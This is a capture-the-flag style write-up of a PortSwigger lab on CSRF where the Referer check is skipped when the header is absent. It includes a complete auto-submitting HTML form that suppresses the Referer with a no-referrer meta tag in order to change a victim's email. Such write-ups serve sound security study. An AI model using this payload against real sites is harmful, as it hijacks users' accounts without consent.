# CSRF where Referer validation depends on header being present

### Goal - 

use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

### Analysis/Exploitation -

Login as user `wiener`:

Update the email 

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/c4cea6d5-2dc5-4788-a3a5-cf1b7358304b/2024-02-27_15-29.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VSFIWGW4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDrC0P0iGo7mnh1h6YfmP2TmdFjr%2B%2BZkpquCghDLnbMeAIhAMBLBYBrf0Lh7rHN6IOoErAY2RHkGaPidnxPNI5V3L9gKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwr7ckVOrQJs%2BnaNmoq3APEQmrgIukeJR7fdLk2UwQZD2Lr%2Br8im%2FPnvuLoyfusFfHcrqOmLZaGGtrdzq6EG4Ue6%2BeUpkVYmihluIsDFzG4gy1WpeeZgAb0uehtjqOeKTj8Kfawh%2B%2FyufJznpCCVw6p1B3%2Fz%2BviRcMm8yVNwX0N71jPPXvCe0WQJLdGubO%2BIch2BIEAAdQtDfGSa3FEuXxf9gB9Tpg8YWWY13p7jDkUk9x%2BRv0VVWY07wr7S0%2BOqlULVlG8dV8ygblQQo8G%2BAQuvWW7sKRaRuIgjf4Cf2NlaOfJA1j9AZ4VBXU4NIkVq8QPQiF3zupIg7otLncqeDP3fLfjiA8BiQh2OYlyKhcBetgNfz6K%2FgzAMaqdoF2g2oTotw1dZGE1au4TalVJDETqLDeYjDIC1eAAZ1AbnWh2w5w0V90FYvW4NWuOxr9Swm29R4foz77mq%2F1rFJm8%2BGgIXeMj%2FrfeX0zmD1Coz9leUCseJJhSZV7TvVqbYrMImDDZBCBK1O28b2Z6QMRB6xSxvMsIPjXdU1XccvDVjnCM9YVeNJs7gcu9fa5cjyBtyAg3UNK064OThhGnbF%2FDIPdYyhOBgLqYOEXsMxPfhehpBP922iaT65Q1IF%2Biik9v%2BghDnvz0YKW1n8014jCSxqLUBjqkAWrA45uEdErhSGZlNkq0gaXR3Xqd3udecckfM0L1NLeIyKCQVckWk%2BjEAkVjDNkSDY8Zy%2BukfsVT2jSd%2FhCw336G1WJf5NQX9ZtF%2Fsww7y2xdaALtC56hvtbo9fr1iwK5wqpC5FnXIlczebabk9ferV6ysk%2FyAgeQsNycoMjCxXnLbDgFNRLMCgpMzJloLFzi%2FTJax8FramU5cWpvM8jLwzweh1U&X-Amz-Signature=ac5185d88e2a1d46d5075615113e1a54427a6fb9e2a164502cb0ab3b354fc02c&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

> 💡 In order for a CSRF attack to be possible:

  - A relevant action: change a users email
  - Cookie-based session handling: session cookie
  - No unpredictable request parameters: no csrf token
**Generate CSRF PoC** (in prof. version.) or  
**craft a HTML form that performs CSRF attack to the victim:**

use the `exploit server` to test CSRF attack!

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/10ba55c1-6334-4b67-90ca-bbc7fb1d9293/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VSFIWGW4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDrC0P0iGo7mnh1h6YfmP2TmdFjr%2B%2BZkpquCghDLnbMeAIhAMBLBYBrf0Lh7rHN6IOoErAY2RHkGaPidnxPNI5V3L9gKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwr7ckVOrQJs%2BnaNmoq3APEQmrgIukeJR7fdLk2UwQZD2Lr%2Br8im%2FPnvuLoyfusFfHcrqOmLZaGGtrdzq6EG4Ue6%2BeUpkVYmihluIsDFzG4gy1WpeeZgAb0uehtjqOeKTj8Kfawh%2B%2FyufJznpCCVw6p1B3%2Fz%2BviRcMm8yVNwX0N71jPPXvCe0WQJLdGubO%2BIch2BIEAAdQtDfGSa3FEuXxf9gB9Tpg8YWWY13p7jDkUk9x%2BRv0VVWY07wr7S0%2BOqlULVlG8dV8ygblQQo8G%2BAQuvWW7sKRaRuIgjf4Cf2NlaOfJA1j9AZ4VBXU4NIkVq8QPQiF3zupIg7otLncqeDP3fLfjiA8BiQh2OYlyKhcBetgNfz6K%2FgzAMaqdoF2g2oTotw1dZGE1au4TalVJDETqLDeYjDIC1eAAZ1AbnWh2w5w0V90FYvW4NWuOxr9Swm29R4foz77mq%2F1rFJm8%2BGgIXeMj%2FrfeX0zmD1Coz9leUCseJJhSZV7TvVqbYrMImDDZBCBK1O28b2Z6QMRB6xSxvMsIPjXdU1XccvDVjnCM9YVeNJs7gcu9fa5cjyBtyAg3UNK064OThhGnbF%2FDIPdYyhOBgLqYOEXsMxPfhehpBP922iaT65Q1IF%2Biik9v%2BghDnvz0YKW1n8014jCSxqLUBjqkAWrA45uEdErhSGZlNkq0gaXR3Xqd3udecckfM0L1NLeIyKCQVckWk%2BjEAkVjDNkSDY8Zy%2BukfsVT2jSd%2FhCw336G1WJf5NQX9ZtF%2Fsww7y2xdaALtC56hvtbo9fr1iwK5wqpC5FnXIlczebabk9ferV6ysk%2FyAgeQsNycoMjCxXnLbDgFNRLMCgpMzJloLFzi%2FTJax8FramU5cWpvM8jLwzweh1U&X-Amz-Signature=d47f0368482189505845812bb396591bde4aceda8d0da0533932355d103512bb&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/284bd78e-f50c-4407-a692-7550d0ba1fd0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VSFIWGW4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDrC0P0iGo7mnh1h6YfmP2TmdFjr%2B%2BZkpquCghDLnbMeAIhAMBLBYBrf0Lh7rHN6IOoErAY2RHkGaPidnxPNI5V3L9gKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwr7ckVOrQJs%2BnaNmoq3APEQmrgIukeJR7fdLk2UwQZD2Lr%2Br8im%2FPnvuLoyfusFfHcrqOmLZaGGtrdzq6EG4Ue6%2BeUpkVYmihluIsDFzG4gy1WpeeZgAb0uehtjqOeKTj8Kfawh%2B%2FyufJznpCCVw6p1B3%2Fz%2BviRcMm8yVNwX0N71jPPXvCe0WQJLdGubO%2BIch2BIEAAdQtDfGSa3FEuXxf9gB9Tpg8YWWY13p7jDkUk9x%2BRv0VVWY07wr7S0%2BOqlULVlG8dV8ygblQQo8G%2BAQuvWW7sKRaRuIgjf4Cf2NlaOfJA1j9AZ4VBXU4NIkVq8QPQiF3zupIg7otLncqeDP3fLfjiA8BiQh2OYlyKhcBetgNfz6K%2FgzAMaqdoF2g2oTotw1dZGE1au4TalVJDETqLDeYjDIC1eAAZ1AbnWh2w5w0V90FYvW4NWuOxr9Swm29R4foz77mq%2F1rFJm8%2BGgIXeMj%2FrfeX0zmD1Coz9leUCseJJhSZV7TvVqbYrMImDDZBCBK1O28b2Z6QMRB6xSxvMsIPjXdU1XccvDVjnCM9YVeNJs7gcu9fa5cjyBtyAg3UNK064OThhGnbF%2FDIPdYyhOBgLqYOEXsMxPfhehpBP922iaT65Q1IF%2Biik9v%2BghDnvz0YKW1n8014jCSxqLUBjqkAWrA45uEdErhSGZlNkq0gaXR3Xqd3udecckfM0L1NLeIyKCQVckWk%2BjEAkVjDNkSDY8Zy%2BukfsVT2jSd%2FhCw336G1WJf5NQX9ZtF%2Fsww7y2xdaALtC56hvtbo9fr1iwK5wqpC5FnXIlczebabk9ferV6ysk%2FyAgeQsNycoMjCxXnLbDgFNRLMCgpMzJloLFzi%2FTJax8FramU5cWpvM8jLwzweh1U&X-Amz-Signature=fe47684dd9d4d25085232742048dd5f300fb7eb67dec69c323bab1fc6c1bd751&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/49d61922-5ef6-44ef-bd44-dce28f076652/2024-02-27_15-45.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VSFIWGW4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDrC0P0iGo7mnh1h6YfmP2TmdFjr%2B%2BZkpquCghDLnbMeAIhAMBLBYBrf0Lh7rHN6IOoErAY2RHkGaPidnxPNI5V3L9gKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwr7ckVOrQJs%2BnaNmoq3APEQmrgIukeJR7fdLk2UwQZD2Lr%2Br8im%2FPnvuLoyfusFfHcrqOmLZaGGtrdzq6EG4Ue6%2BeUpkVYmihluIsDFzG4gy1WpeeZgAb0uehtjqOeKTj8Kfawh%2B%2FyufJznpCCVw6p1B3%2Fz%2BviRcMm8yVNwX0N71jPPXvCe0WQJLdGubO%2BIch2BIEAAdQtDfGSa3FEuXxf9gB9Tpg8YWWY13p7jDkUk9x%2BRv0VVWY07wr7S0%2BOqlULVlG8dV8ygblQQo8G%2BAQuvWW7sKRaRuIgjf4Cf2NlaOfJA1j9AZ4VBXU4NIkVq8QPQiF3zupIg7otLncqeDP3fLfjiA8BiQh2OYlyKhcBetgNfz6K%2FgzAMaqdoF2g2oTotw1dZGE1au4TalVJDETqLDeYjDIC1eAAZ1AbnWh2w5w0V90FYvW4NWuOxr9Swm29R4foz77mq%2F1rFJm8%2BGgIXeMj%2FrfeX0zmD1Coz9leUCseJJhSZV7TvVqbYrMImDDZBCBK1O28b2Z6QMRB6xSxvMsIPjXdU1XccvDVjnCM9YVeNJs7gcu9fa5cjyBtyAg3UNK064OThhGnbF%2FDIPdYyhOBgLqYOEXsMxPfhehpBP922iaT65Q1IF%2Biik9v%2BghDnvz0YKW1n8014jCSxqLUBjqkAWrA45uEdErhSGZlNkq0gaXR3Xqd3udecckfM0L1NLeIyKCQVckWk%2BjEAkVjDNkSDY8Zy%2BukfsVT2jSd%2FhCw336G1WJf5NQX9ZtF%2Fsww7y2xdaALtC56hvtbo9fr1iwK5wqpC5FnXIlczebabk9ferV6ysk%2FyAgeQsNycoMjCxXnLbDgFNRLMCgpMzJloLFzi%2FTJax8FramU5cWpvM8jLwzweh1U&X-Amz-Signature=13cb54b18039e5ccf1a462792c732a2e017b34a8ba5d1cd0a2b5f6e979677f35&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

Since the `Referer` HTTP header can be fully controlled by the attacker, we can bypass this check!

send this request into Repeater and simply remove the referrer header, 

The request goes through and the email gets changed

In this case I need to coerce the browser of the victim to not send the referrer header.

> 💡 **According to **[**Mozilla web docs**](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)**, we can use the **`<meta>`** tag to ignore **`Referer`** HTTP header:**

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051342.png)

![](https://raw.githubusercontent.com/siunam321/CTF-Writeups/main/Portswigger-Labs/CSRF/CSRF-11/images/Pasted%20image%2020221215051352.png)

**To bypass that, add a new **`<meta>`** tag to ignore **`Referer`** header:**

 integrate directive into the HTML code itself:

```html
<html>
  <head>
	    <meta name="referrer" content="no-referrer">
    </head>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a2b0080046a2b6781242625009d001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test1&#64;domain&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/f91b02fc-1932-415d-9fbe-0af59f93a9c2/2024-02-27_16-07.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VSFIWGW4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDrC0P0iGo7mnh1h6YfmP2TmdFjr%2B%2BZkpquCghDLnbMeAIhAMBLBYBrf0Lh7rHN6IOoErAY2RHkGaPidnxPNI5V3L9gKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwr7ckVOrQJs%2BnaNmoq3APEQmrgIukeJR7fdLk2UwQZD2Lr%2Br8im%2FPnvuLoyfusFfHcrqOmLZaGGtrdzq6EG4Ue6%2BeUpkVYmihluIsDFzG4gy1WpeeZgAb0uehtjqOeKTj8Kfawh%2B%2FyufJznpCCVw6p1B3%2Fz%2BviRcMm8yVNwX0N71jPPXvCe0WQJLdGubO%2BIch2BIEAAdQtDfGSa3FEuXxf9gB9Tpg8YWWY13p7jDkUk9x%2BRv0VVWY07wr7S0%2BOqlULVlG8dV8ygblQQo8G%2BAQuvWW7sKRaRuIgjf4Cf2NlaOfJA1j9AZ4VBXU4NIkVq8QPQiF3zupIg7otLncqeDP3fLfjiA8BiQh2OYlyKhcBetgNfz6K%2FgzAMaqdoF2g2oTotw1dZGE1au4TalVJDETqLDeYjDIC1eAAZ1AbnWh2w5w0V90FYvW4NWuOxr9Swm29R4foz77mq%2F1rFJm8%2BGgIXeMj%2FrfeX0zmD1Coz9leUCseJJhSZV7TvVqbYrMImDDZBCBK1O28b2Z6QMRB6xSxvMsIPjXdU1XccvDVjnCM9YVeNJs7gcu9fa5cjyBtyAg3UNK064OThhGnbF%2FDIPdYyhOBgLqYOEXsMxPfhehpBP922iaT65Q1IF%2Biik9v%2BghDnvz0YKW1n8014jCSxqLUBjqkAWrA45uEdErhSGZlNkq0gaXR3Xqd3udecckfM0L1NLeIyKCQVckWk%2BjEAkVjDNkSDY8Zy%2BukfsVT2jSd%2FhCw336G1WJf5NQX9ZtF%2Fsww7y2xdaALtC56hvtbo9fr1iwK5wqpC5FnXIlczebabk9ferV6ysk%2FyAgeQsNycoMjCxXnLbDgFNRLMCgpMzJloLFzi%2FTJax8FramU5cWpvM8jLwzweh1U&X-Amz-Signature=0b20fb4a8035646836159add0e1e421c4d414afd6ab280b23455f2cf11af8a29&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

or As an alternative, update exploit page header with the relevant syntax:

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/e1cd84d1-fe2e-4ac3-bbc1-2a85212aa532/2024-02-27_16-05.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466VSFIWGW4%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T204631Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDrC0P0iGo7mnh1h6YfmP2TmdFjr%2B%2BZkpquCghDLnbMeAIhAMBLBYBrf0Lh7rHN6IOoErAY2RHkGaPidnxPNI5V3L9gKogECKz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQABoMNjM3NDIzMTgzODA1Igwr7ckVOrQJs%2BnaNmoq3APEQmrgIukeJR7fdLk2UwQZD2Lr%2Br8im%2FPnvuLoyfusFfHcrqOmLZaGGtrdzq6EG4Ue6%2BeUpkVYmihluIsDFzG4gy1WpeeZgAb0uehtjqOeKTj8Kfawh%2B%2FyufJznpCCVw6p1B3%2Fz%2BviRcMm8yVNwX0N71jPPXvCe0WQJLdGubO%2BIch2BIEAAdQtDfGSa3FEuXxf9gB9Tpg8YWWY13p7jDkUk9x%2BRv0VVWY07wr7S0%2BOqlULVlG8dV8ygblQQo8G%2BAQuvWW7sKRaRuIgjf4Cf2NlaOfJA1j9AZ4VBXU4NIkVq8QPQiF3zupIg7otLncqeDP3fLfjiA8BiQh2OYlyKhcBetgNfz6K%2FgzAMaqdoF2g2oTotw1dZGE1au4TalVJDETqLDeYjDIC1eAAZ1AbnWh2w5w0V90FYvW4NWuOxr9Swm29R4foz77mq%2F1rFJm8%2BGgIXeMj%2FrfeX0zmD1Coz9leUCseJJhSZV7TvVqbYrMImDDZBCBK1O28b2Z6QMRB6xSxvMsIPjXdU1XccvDVjnCM9YVeNJs7gcu9fa5cjyBtyAg3UNK064OThhGnbF%2FDIPdYyhOBgLqYOEXsMxPfhehpBP922iaT65Q1IF%2Biik9v%2BghDnvz0YKW1n8014jCSxqLUBjqkAWrA45uEdErhSGZlNkq0gaXR3Xqd3udecckfM0L1NLeIyKCQVckWk%2BjEAkVjDNkSDY8Zy%2BukfsVT2jSd%2FhCw336G1WJf5NQX9ZtF%2Fsww7y2xdaALtC56hvtbo9fr1iwK5wqpC5FnXIlczebabk9ferV6ysk%2FyAgeQsNycoMjCxXnLbDgFNRLMCgpMzJloLFzi%2FTJax8FramU5cWpvM8jLwzweh1U&X-Amz-Signature=b8d3751ea584792b0bd4356fc452797027f0f884fb938b3913e4ac1257e3ab8e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

